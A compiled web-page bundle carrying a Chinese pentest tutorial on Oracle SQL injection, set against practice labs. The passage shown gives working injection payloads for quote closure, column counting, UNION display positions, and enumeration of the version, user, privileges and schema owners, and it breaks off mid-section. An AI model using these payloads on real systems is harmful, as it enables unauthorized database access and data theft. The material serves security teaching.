"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[4549],{4249:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223203800201-12190cc7bb3efd52c1273d1783833b82.png"},6304:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223195210818-eeeec5de6220fbe1c186991403b0e617.png"},9141:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223210351978-39004a7b89aea4f96dfdce7f8c40e14e.png"},12124:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211224124338559-a5894ed273ccca766932cef52bb4910d.png"},15083:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223202327433-85ea1b591ee6cdadfe8af2a2540919c5.png"},17244:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211224112854883-1c89a2b31ebb4d22d686e88f879db193.png"},17960:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211224125649485-78bcafe11fdafc56db7bbe76ad81dbca.png"},20430:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223203552839-4467f234a1e2fbeff3d3faef5844c66b.png"},21514:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211224110933740-189567d0e44d5b068ec30fd1e507aede.png"},23659:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223201240401-aa465535ffa0f867359407f3fbc192d3.png"},28453:(e,s,n)=>{n.d(s,{R:()=>c,x:()=>d});var l=n(96540);const r={},i=l.createContext(r);function c(e){const s=l.useContext(i);return l.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function d(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:c(e.components),l.createElement(i.Provider,{value:s},e.children)}},28611:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>a,contentTitle:()=>d,default:()=>o,frontMatter:()=>c,metadata:()=>l,toc:()=>t});const l=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/Oracle/\u5404\u79cd\u6ce8\u5165\u624b\u6cd5","title":"\u5404\u79cd\u6ce8\u5165\u624b\u6cd5","description":"\u524d\u8a00","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/05.Oracle/02.\u5404\u79cd\u6ce8\u5165\u624b\u6cd5.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/05.Oracle","slug":"/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/Oracle/\u5404\u79cd\u6ce8\u5165\u624b\u6cd5","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/Oracle/\u5404\u79cd\u6ce8\u5165\u624b\u6cd5","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"d4m1ts","lastUpdatedAt":1748784450000,"sidebarPosition":2,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"\u5e38\u7528\u7b26\u53f7:\u51fd\u6570:\u8bed\u53e5\u5f52\u7c7b","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/Oracle/\u5e38\u7528\u7b26\u53f7:\u51fd\u6570:\u8bed\u53e5\u5f52\u7c7b"},"next":{"title":"\u7ed5\u8fc7\u6280\u5de7","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/Oracle/\u7ed5\u8fc7\u6280\u5de7"}}');var r=n(74848),i=n(28453);const c={},d=void 0,a={},t=[{value:"\u524d\u8a00",id:"\u524d\u8a00",level:2},{value:"\u6982\u8ff0",id:"\u6982\u8ff0",level:3},{value:"\u6ce8\u610f",id:"\u6ce8\u610f",level:3},{value:"\u8054\u5408\u67e5\u8be2(UNION)\u6ce8\u5165",id:"\u8054\u5408\u67e5\u8be2union\u6ce8\u5165",level:2},{value:"\u6982\u8ff0",id:"\u6982\u8ff0-1",level:3},{value:"\u6ce8\u5165\u6d41\u7a0b",id:"\u6ce8\u5165\u6d41\u7a0b",level:3},{value:"\u6ce8\u5165\u8bed\u53e5",id:"\u6ce8\u5165\u8bed\u53e5",level:3},{value:"<strong>\u95ed\u5408\u60c5\u51b5</strong>",id:"\u95ed\u5408\u60c5\u51b5",level:4},{value:"<strong>\u67e5\u8be2\u5b57\u6bb5\u6570</strong>",id:"\u67e5\u8be2\u5b57\u6bb5\u6570",level:4},{value:"<strong>\u786e\u5b9a\u663e\u4f4d</strong>",id:"\u786e\u5b9a\u663e\u4f4d",level:4},{value:"\u67e5\u8be2\u6570\u636e",id:"\u67e5\u8be2\u6570\u636e",level:4},{value:"\u62a5\u9519\u6ce8\u5165",id:"\u62a5\u9519\u6ce8\u5165",level:2},{value:"\u6982\u8ff0",id:"\u6982\u8ff0-2",level:3},{value:"\u62a5\u9519\u51fd\u6570",id:"\u62a5\u9519\u51fd\u6570",level:3},{value:"ctxsys.drithsx.sn()",id:"ctxsysdrithsxsn",level:4},{value:"XMLType()",id:"xmltype",level:4},{value:"dbms_xdb_version.checkin()",id:"dbms_xdb_versioncheckin",level:4},{value:"dbms_xdb_version.makeversioned()",id:"dbms_xdb_versionmakeversioned",level:4},{value:"dbms_xdb_version.uncheckout()",id:"dbms_xdb_versionuncheckout",level:4},{value:"dbms_utility.sqlid_to_sqlhash()",id:"dbms_utilitysqlid_to_sqlhash",level:4},{value:"ordsys.ord_dicom.getmappingxpath()",id:"ordsysord_dicomgetmappingxpath",level:4},{value:"utl_inaddr.*()",id:"utl_inaddr",level:4},{value:"\u76f2\u6ce8",id:"\u76f2\u6ce8",level:2},{value:"\u5e03\u5c14\u76f2\u6ce8",id:"\u5e03\u5c14\u76f2\u6ce8",level:3},{value:"\u6982\u8ff0",id:"\u6982\u8ff0-3",level:4},{value:"\u6ce8\u5165\u6d41\u7a0b",id:"\u6ce8\u5165\u6d41\u7a0b-1",level:4},{value:"\u5e38\u7528\u51fd\u6570",id:"\u5e38\u7528\u51fd\u6570",level:4},{value:"\u6ce8\u5165\u4e3e\u4f8b",id:"\u6ce8\u5165\u4e3e\u4f8b",level:4},{value:"\u65f6\u95f4\u76f2\u6ce8",id:"\u65f6\u95f4\u76f2\u6ce8",level:3},{value:"\u6982\u8ff0",id:"\u6982\u8ff0-4",level:4},{value:"\u5e38\u7528\u51fd\u6570",id:"\u5e38\u7528\u51fd\u6570-1",level:4},{value:"DBMS_PIPE.RECEIVE_MESSAGE",id:"dbms_pipereceive_message",level:4},{value:"\u51fd\u6570\u6ce8\u5165\u4e3e\u4f8b",id:"\u51fd\u6570\u6ce8\u5165\u4e3e\u4f8b",level:4},{value:"\u5b50\u67e5\u8be2/\u8d85\u5927\u8868\u6784\u9020\u65f6\u95f4\u76f2\u6ce8",id:"\u5b50\u67e5\u8be2\u8d85\u5927\u8868\u6784\u9020\u65f6\u95f4\u76f2\u6ce8",level:4},{value:"\u5e26\u5916(OOB)\u6ce8\u5165",id:"\u5e26\u5916oob\u6ce8\u5165",level:2},{value:"\u6982\u8ff0",id:"\u6982\u8ff0-5",level:3},{value:"\u5229\u7528\u51fd\u6570",id:"\u5229\u7528\u51fd\u6570",level:3},{value:"url_http.request()",id:"url_httprequest",level:4},{value:"utl_inaddr.get_host_address()",id:"utl_inaddrget_host_address",level:4},{value:"SYS.DBMS_LDAP.INIT()",id:"sysdbms_ldapinit",level:4},{value:"HTTPURITYPE()",id:"httpuritype",level:4},{value:"\u6269\u5c55",id:"\u6269\u5c55",level:2},{value:"Oracle XXE",id:"oracle-xxe",level:3},{value:"Oracle \u63d0\u6743\u6f0f\u6d1e",id:"oracle-\u63d0\u6743\u6f0f\u6d1e",level:3},{value:"\u547d\u4ee4\u6267\u884c",id:"\u547d\u4ee4\u6267\u884c",level:4},{value:"\u53cd\u5f39shell",id:"\u53cd\u5f39shell",level:4}];function h(e){const s={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",h4:"h4",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.h2,{id:"\u524d\u8a00",children:"\u524d\u8a00"}),"\n",(0,r.jsx)(s.h3,{id:"\u6982\u8ff0",children:"\u6982\u8ff0"}),"\n",(0,r.jsx)(s.p,{children:"oracle\u7684\u6ce8\u5165\u76f8\u6bd4\u4e8emysql\u548cmssql\uff0c\u5229\u7528\u66f4\u96be"}),"\n",(0,r.jsxs)(s.p,{children:["\u7531\u4e8e\u5bf9oracle\u7684\u6570\u636e\u5e93\u6ce8\u5165\u63a5\u89e6\u8f83\u5c11\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528oracle\u7684",(0,r.jsx)(s.a,{href:"https://github.com/ChaMd5Team/Pentest-tools/tree/master/Oracleinject",children:"docker"}),"\u6765\u914d\u5408\u7ec3\u4e60oracle\u7684sql\u8bed\u53e5"]}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.strong,{children:"\u9776\u573a\u73af\u5883\u63a8\u8350\uff1a"})}),"\n",(0,r.jsxs)(s.table,{children:[(0,r.jsx)(s.thead,{children:(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.th,{children:"\u73af\u5883"}),(0,r.jsx)(s.th,{children:"\u5730\u5740"})]})}),(0,r.jsxs)(s.tbody,{children:[(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"web"}),(0,r.jsxs)(s.td,{children:[(0,r.jsx)(s.a,{href:"https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle",children:"https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle"}),(0,r.jsx)("br",{}),(0,r.jsx)(s.a,{href:"https://portswigger.net/web-security/all-labs",children:"https://portswigger.net/web-security/all-labs"}),(0,r.jsx)("br",{}),(0,r.jsx)(s.a,{href:"http://o1.lab.aqlab.cn:81/?id=1",children:"http://o1.lab.aqlab.cn:81/?id=1"})]})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"docker"}),(0,r.jsx)(s.td,{children:(0,r.jsx)(s.a,{href:"https://github.com/ChaMd5Team/Pentest-tools/tree/master/Oracleinject",children:"https://github.com/ChaMd5Team/Pentest-tools/tree/master/Oracleinject"})})]})]})]}),"\n",(0,r.jsx)(s.h3,{id:"\u6ce8\u610f",children:"\u6ce8\u610f"}),"\n",(0,r.jsx)(s.p,{children:"\u4e0eMySQL\uff0cMSSQL\u4e00\u6837\uff0cOracle\u6570\u636e\u5e93\u4e5f\u662f\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e14\u652f\u6301\u6807\u51c6\u578bSQL\u8bed\u53e5\uff0c\u6240\u4ee5\u6ce8\u5165\u65b9\u5f0f\u548c\u5176\u4ed6\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e00\u6837\uff0c\u4e0d\u8fc7\u6709\u4e00\u70b9\u7279\u6b8a\uff0c\u8fd9\u91cc\u5f3a\u8c03\u4e00\u4e0bOracle\u67e5\u8be2\u6570\u636e\u7684\u7279\u6027\uff1a"}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsxs)(s.strong,{children:["Oracle\u4f7f\u7528\u67e5\u8be2\u8bed\u53e5\u83b7\u53d6\u6570\u636e\u65f6\u9700\u8981\u8ddf\u4e0a\u8868\u540d\uff0c\u5728\u6ca1\u6709\u8868\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4f7f\u7528",(0,r.jsx)(s.code,{children:"dual"}),"\uff0c",(0,r.jsx)(s.code,{children:"dual"}),"\u662fOracle\u7684\u4e00\u4e2a\u865a\u62df\u8868\uff0c\u7528\u6765\u6784\u6210select\u7684\u8bed\u6cd5\u89c4\u5219\uff0c\u4e14Oracle\u4fdd\u8bc1",(0,r.jsx)(s.code,{children:"dual"}),"\u91cc\u6c38\u8fdc\u53ea\u6709\u4e00\u6761\u8bb0\u5f55"]})}),"\n"]}),"\n",(0,r.jsx)(s.p,{children:"\u4e3e\u4f8b\uff1a"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u5728mysql\uff0cmssql\uff0cpostgresql\u4e2d\u90fd\u662f\u6b63\u786e\u7684\nselect 1,2;\n\n-- \u4f46\u662f\u5728Oracle\u4e2d\uff0c\u5fc5\u987b\u8981\u5e26\u4e0adual\u865a\u8868\nselect 1,2 from dual;\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223190103007",src:n(83108).A+"",width:"984",height:"562"})}),"\n",(0,r.jsxs)(s.ol,{start:"2",children:["\n",(0,r.jsxs)(s.li,{children:["\u4e0e",(0,r.jsx)(s.code,{children:"Postgresql"}),"\u4e00\u6837\uff0cOracle \u7684",(0,r.jsx)(s.code,{children:"||"}),"\u662f\u5b57\u7b26\u4e32\u8fde\u63a5\u7b26"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select 1||2 from dual; -- 12\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223190145819",src:n(65355).A+"",width:"562",height:"232"})}),"\n",(0,r.jsxs)(s.ol,{start:"3",children:["\n",(0,r.jsxs)(s.li,{children:["\u5728oracle\u4e2d\u5b58\u5728",(0,r.jsx)(s.code,{children:"concat()"}),"\u51fd\u6570\uff08\u7528\u6cd5\u540cMysql concat()\uff0c\u4f46\u53ea\u80fd\u6709\u4e24\u4e2a\u53c2\u6570\uff09\uff0c\u805a\u5408\u6240\u6709\u7ed3\u679c\u7684\u8fde\u63a5\u51fd\u6570",(0,r.jsx)(s.code,{children:"wm_concat()"}),"\u51fd\u6570\uff08\u540cmysql group_concat()\uff09"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select concat(1,2) from dual; -- 12\nselect concat(1,2,3) from dual; -- ORA-00909: invalid number of arguments\n"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u521b\u5efa\u8868\u548c\u6dfb\u52a0\u6570\u636e\nCREATE TABLE SYS.test(first_name VARCHAR2(50) NOT NULL,last_name VARCHAR2(50) NOT NULL);\ninsert into test(first_name,last_name) values ('test1','test2');\ninsert into test(first_name,last_name) values ('test3','test4');\ninsert into test(first_name,last_name) values ('admin','haha');\n\nselect wm_concat(first_name) from test;\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223195210818",src:n(6304).A+"",width:"948",height:"264"})}),"\n",(0,r.jsx)(s.p,{children:"4.oracle\u4e0d\u652f\u6301\u5806\u53e0\u67e5\u8be2"}),"\n",(0,r.jsx)(s.h2,{id:"\u8054\u5408\u67e5\u8be2union\u6ce8\u5165",children:"\u8054\u5408\u67e5\u8be2(UNION)\u6ce8\u5165"}),"\n",(0,r.jsx)(s.h3,{id:"\u6982\u8ff0-1",children:"\u6982\u8ff0"}),"\n",(0,r.jsxs)(s.p,{children:["\u8054\u5408\u67e5\u8be2\u6ce8\u5165\uff0c\u548c\u5176\u4ed6\u5173\u7cfb\u578b\u6570\u636e\u5e93\u6ce8\u5165\u65b9\u5f0f\u4e00\u81f4\uff0c\u9700\u8981\u6ce8\u5165\u7684\u9875\u9762\u6709\u660e\u663e\u7684\u56de\u663e\u4f4d\uff0c\u5176\u4f5c\u7528\u5c31\u662f\uff0c\u5728\u539f\u6765\u7684\u67e5\u8be2\u6761\u4ef6\u7684\u57fa\u7840\u4e0a\uff0c\u901a\u8fc7\u5173\u952e\u5b57 ",(0,r.jsx)(s.code,{children:"union"}),"\uff0c",(0,r.jsx)(s.code,{children:"union all"}),"\uff0c\u4ece\u800c\u62fc\u63a5\u6076\u610fSQL\u8bed\u53e5\uff0c",(0,r.jsx)(s.code,{children:"union"}),"\u540e\u9762\u7684",(0,r.jsx)(s.code,{children:"select"})," \u5f97\u5230\u7684\u7ed3\u679c\u5c06\u62fc\u63a5\u5230\u524d\u4e2a",(0,r.jsx)(s.code,{children:"select"}),"\u7684\u7ed3\u679c\u7684\u540e\u9762"]}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsxs)(s.p,{children:["\u82e5\u56de\u663e\u4ec5\u652f\u6301\u4e00\u884c\u6570\u636e\u7684\u8bdd\uff0c\u8ba9",(0,r.jsx)(s.code,{children:"union"}),"\u524d\u8fb9\u6b63\u5e38\u7684\u67e5\u8be2\u8bed\u53e5\u8fd4\u56de\u7684\u7ed3\u679c\u4e3a\u7a7a"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsx)(s.p,{children:"\u4f7f\u7528union select\u8fdb\u884c\u62fc\u63a5\u65f6\uff0c\u6ce8\u610f\u524d\u540e\u4e24\u4e2aselect\u8bed\u53e5\u7684\u8fd4\u56de\u7684\u5b57\u6bb5\u6570\u5fc5\u987b\u76f8\u540c\uff0c\u5426\u5219\u65e0\u6cd5\u62fc\u63a5"}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.code,{children:"union"}),",",(0,r.jsx)(s.code,{children:"union all"}),"\u533a\u522b\uff1a"]}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.code,{children:"union"}),": \u5bf9\u4e24\u4e2a\u7ed3\u679c\u96c6\u8fdb\u884c\u5e76\u96c6\u64cd\u4f5c\uff0c\u4e0d\u5305\u62ec\u91cd\u590d\u884c\uff0c\u540c\u65f6\u8fdb\u884c\u9ed8\u8ba4\u89c4\u5219\u7684\u6392\u5e8f"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.code,{children:"union all"}),": \u5bf9\u4e24\u4e2a\u7ed3\u679c\u96c6\u8fdb\u884c\u5e76\u96c6\u64cd\u4f5c\uff0c\u5305\u62ec\u91cd\u590d\u884c\uff0c\u4e0d\u8fdb\u884c\u6392\u5e8f\uff1b"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(s.h3,{id:"\u6ce8\u5165\u6d41\u7a0b",children:"\u6ce8\u5165\u6d41\u7a0b"}),"\n",(0,r.jsx)(s.p,{children:"\u8fd9\u91cc\u8bb0\u5f55\u5b8c\u6574\u7684\u6d41\u7a0b\u548c\u8bed\u53e5\uff0c\u5176\u4ed6\u65b9\u5f0f\u7684\u6ce8\u5165\u8bed\u53e5\u7c7b\u4f3c\u5c31\u4e0d\u518d\u5199\u4e86"}),"\n",(0,r.jsx)(s.p,{children:"\u548c\u5176\u4ed6\u7684UNION\u6ce8\u5165\u65b9\u5f0f\u548c\u6b65\u9aa4\u4e00\u6837\uff0c\u90fd\u662f"}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:"\u786e\u8ba4\u95ed\u5408\u60c5\u51b5"}),"\n",(0,r.jsx)(s.li,{children:"\u786e\u5b9a\u5b57\u6bb5\u7684\u6570\u91cf"}),"\n",(0,r.jsx)(s.li,{children:"\u786e\u5b9a\u9875\u9762\u56de\u663e\u4f4d"}),"\n",(0,r.jsx)(s.li,{children:"\u5229\u7528\u5df2\u77e5\u56de\u663e\u4f4d\u67e5\u8be2\u6570\u636e\na.\u67e5\u8be2\u6570\u636e\u5e93\u57fa\u672c\u4fe1\u606f\nb.\u7206\u5e93\u540d\nc.\u7206\u8868\u540d\nd.\u7206\u5b57\u6bb5\ne.\u67e5\u8be2\u654f\u611f\u4fe1\u606f"}),"\n"]}),"\n",(0,r.jsx)(s.h3,{id:"\u6ce8\u5165\u8bed\u53e5",children:"\u6ce8\u5165\u8bed\u53e5"}),"\n",(0,r.jsxs)(s.blockquote,{children:["\n",(0,r.jsxs)(s.p,{children:["\u73af\u5883\u4f7f\u7528portswigger\u7684\u9776\u573a\uff1a",(0,r.jsx)(s.a,{href:"https://aca31f611e47df03c0ef5e5100e400c3.web-security-academy.net/",children:"https://aca31f611e47df03c0ef5e5100e400c3.web-security-academy.net/"})]}),"\n"]}),"\n",(0,r.jsx)(s.h4,{id:"\u95ed\u5408\u60c5\u51b5",children:(0,r.jsx)(s.strong,{children:"\u95ed\u5408\u60c5\u51b5"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"' and '1'='1 -- \u6b63\u5e38\n' and '1'='0 -- \u9519\u8bef\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u5f97\u51fa\u53ef\u4ee5\u4f7f\u7528\u5355\u5f15\u53f7\u95ed\u5408"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223200551361",src:n(67348).A+"",width:"2606",height:"1600"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223200642642",src:n(99337).A+"",width:"1862",height:"1390"})}),"\n",(0,r.jsx)(s.h4,{id:"\u67e5\u8be2\u5b57\u6bb5\u6570",children:(0,r.jsx)(s.strong,{children:"\u67e5\u8be2\u5b57\u6bb5\u6570"})}),"\n",(0,r.jsxs)(s.p,{children:["\u8fd8\u662f\u4f7f\u7528",(0,r.jsx)(s.code,{children:"order by"})]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"order by 2 -- - \u6b63\u5e38\norder by 3 -- - \u4e0d\u6b63\u5e38\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u5f97\u51fa\u5217\u6570\u4e3a2"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223200744759",src:n(96465).A+"",width:"1646",height:"958"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223200815996",src:n(84103).A+"",width:"1352",height:"554"})}),"\n",(0,r.jsx)(s.h4,{id:"\u786e\u5b9a\u663e\u4f4d",children:(0,r.jsx)(s.strong,{children:"\u786e\u5b9a\u663e\u4f4d"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"union select '1','2' from dual -- -\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u6ce8\u610f\uff1a"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsxs)(s.p,{children:["\u82e5\u786e\u5b9a\u9875\u9762\u6709\u56de\u663e\uff0c\u4f46\u662f\u9875\u9762\u4e2d\u5e76\u6ca1\u6709\u6211\u4eec\u5b9a\u4e49\u7684\u7279\u6b8a\u6807\u8bb0\u6570\u5b57\u51fa\u73b0\uff0c\u53ef\u80fd\u662f\u9875\u9762\u73b0\u5728\u4e86\u5355\u884c\u6570\u636e\u8f93\u51fa\uff0c\u6211\u4eec\u8ba9\u524d\u8fb9\u7684select\u67e5\u8be2\u6761\u4ef6\u8fd4\u56de\u7ed3\u679c\u4e3a\u7a7a\u5373\u53ef\uff0c\u4e5f\u5c31\u662f\u4e3a\u5565\u4e0b\u56fe\u7684",(0,r.jsx)(s.code,{children:"Pets"}),"\u524d\u9762\u52a0\u4e86\u4e2a",(0,r.jsx)(s.code,{children:"-"})]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsx)(s.p,{children:"\u6ce8\u610f\u4e00\u5b9a\u8981\u62fc\u63a5\u591f\u8db3\u591f\u7684\u5b57\u6bb5\u6570\uff0c\u5426\u5219SQL\u8bed\u53e5\u62a5\u9519\u3002PS\uff1a\u6b64\u65b9\u6cd5\u4e5f\u53ef\u4f5c\u4e3a\u5224\u65ad\u524d\u6761select\u8bed\u53e5\u7684\u65b9\u6cd5\u4e4b\u4e00"}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsx)(s.p,{children:"\u5982\u679cunion\u524d\u9762\u7684\u67e5\u8be2\u6761\u4ef6\u8fd4\u56de\u4e3a\u7a7a\u7684\u60c5\u51b5\u4e0b\uff0c\u4e5f\u6ca1\u6709\u6807\u8bb0\u6570\u5b57\uff0c\u8fd9\u65f6\u5019\u4e00\u822c\u662f\u7c7b\u578b\u51fa\u9519\uff0c\u5bfc\u81f4\u65e0\u6cd5\u663e\u793a\u5728\u9875\u9762\uff0c\u53ef\u4ee5\u5c06\u6570\u5b57\u66f4\u6539\u672anull\u6216\u8005\u5b57\u7b26\u4e32\u683c\u5f0f\uff1b\u66f4\u6539\u4e3anull\u540e\u4e0d\u4f1a\u5728\u9875\u9762\u663e\u793a"}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(s.p,{children:"\u53ef\u4ee5\u770b\u51fa\u663e\u4f4d\u662f1\u548c2"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223201240401",src:n(23659).A+"",width:"1960",height:"880"})}),"\n",(0,r.jsx)(s.h4,{id:"\u67e5\u8be2\u6570\u636e",children:"\u67e5\u8be2\u6570\u636e"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"\u63a2\u6d4bOracle\u7248\u672c"})}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select banner from v$version;\nselect banner from v$version where banner like 'Oracle%';\nselect version from v$instance;\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223201648290",src:n(85603).A+"",width:"2058",height:"1012"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"\u63a2\u6d4b\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c"})}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select banner from v$version where banner like 'TNS%'\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223201801494",src:n(37424).A+"",width:"2336",height:"594"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"\u63a2\u6d4b\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237"})}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select user from dual;\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223201858440",src:n(48965).A+"",width:"1960",height:"528"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"\u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237\u6743\u9650"})}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select privilege from session_privs;\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223201953526",src:n(30822).A+"",width:"2156",height:"1034"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u6570\u636e\u592a\u591a\uff0cOracle \u5b9e\u73b0limit \u4f7f\u7528rownum\uff0c\u6784\u9020between...and...\nselect * from (select t.* ,rownum as no from (select * from session_privs)t) where no = 5\nselect * from (select t.* ,rownum as no from (select * from session_privs)t) where no between 1 and 10\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223202327433",src:n(15083).A+"",width:"2256",height:"612"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"\u83b7\u53d6\u7528\u6237\u6240\u62e5\u6709\u6743\u9650\u7684\u6570\u636e\u5e93"})}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select distinct owner from all_tables\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223202526969",src:n(94314).A+"",width:"2194",height:"1542"})}),"\n",(0,r.jsxs)(s.blockquote,{children:["\n",(0,r.jsx)(s.p,{children:"\u7531\u4e8eOracle\u4e2d\u4f7f\u7528 Schema \u7684\u6982\u5ff5\u5c06\u6bcf\u4e2a\u7528\u6237\u7684\u6570\u636e\u8fdb\u884c\u5206\u79bb\uff0cSchema \u5176\u5b9e\u7c7b\u4f3c\u4e8e\u547d\u540d\u7a7a\u95f4\uff08Namespace\uff09\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cSchema 